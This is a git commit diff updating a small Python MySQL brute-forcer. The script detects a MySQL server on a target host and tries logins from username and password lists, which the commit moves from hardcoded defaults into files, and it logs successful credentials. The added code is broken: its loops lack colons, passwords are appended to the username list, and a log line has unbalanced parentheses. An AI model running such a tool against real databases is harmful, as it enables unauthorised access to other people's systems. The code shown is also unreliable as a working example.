cfcf58c59aa936677e5313512c5d8010e1a636a7
Phaedrik <46567924+Phaedrik@users.noreply.github.com>
2019-01-11 08:33:54 -0500

    Update mysql_minibruteforcer.py

--- mysql_minibruteforcer.py
+++ mysql_minibruteforcer.py
@@ -1,13 +1,29 @@
 #!/usr/bin/env python
 import mysql.connector
 import sys
+import datetime
 
 argv = sys.argv
 host = argv[1]
-username = ('root', 'wes', 'wes2', 'admin', 'jonwilson')
-password = ('', 'Bacon@123', 'Pancake@123', 'Banana@123', 'NCR')
+
+#Opens both username and password files to be used in the brute force
+username = []
+with open('usernames.txt', 'r') as f:
+    for line in f
+    username.append(line.strip())
+
+password = []
+with open('password.txt', 'r') as f:
+    for line in f
+    username.append(line.strip())
+    
+date = datetime.datetime.now()
+log = open('mysqllog.txt', 'a')
+log.write('**' + str(date) + '\n')
+
 mysqlconnection = False
 
+#Attempts to establish connection to a mysql server on host and port 3306
 print 'Looking for mysql server on {0}'.format(host)
 try:
     mydb = mysql.connector.connect(
@@ -18,9 +34,13 @@ try:
     )
 except mysql.connector.errors.ProgrammingError:
     print 'MySql server found! Attempting to login'
+    mysqlconnection = True
 except mysql.connector.errors.InterfaceError:
     print 'MySql server not found.'
+    
+connect = False    
 
+#If connection was established and there is a mysql server, attemtps to login with weak and default credentials
 if mysqlconnection is True:
     for users in username:
         print "Trying to login as {0}".format(users)
@@ -32,7 +52,13 @@ if mysqlconnection is True:
                     password=pw
                 )
                 print 'Login succesful using {0} and {1}'.format(users, pw)
+                connect = True
+                if connect is True:
+                    log.write("Login successful using {0} and {1} on host {2}\n").format(users, pw, host))
             except mysql.connector.errors.ProgrammingError:
                 pass
+            except mysql.connector.errors.InterfaceError:
+                print "Seems we cannot connect"
+                exit()
 
 
